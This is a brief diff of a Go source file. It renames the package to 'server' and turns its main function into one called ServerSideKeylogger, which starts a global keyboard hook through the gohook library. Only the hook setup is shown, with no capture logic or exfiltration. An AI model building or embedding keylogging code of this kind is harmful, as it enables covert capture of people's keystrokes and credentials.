@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"fmt"
@@ -7,7 +7,7 @@ import (
 	hook "github.com/robotn/gohook"
 )
 
-func main() {
+func ServerSideKeylogger() {
 
 	evchan := hook.Start()
 	defer hook.End()
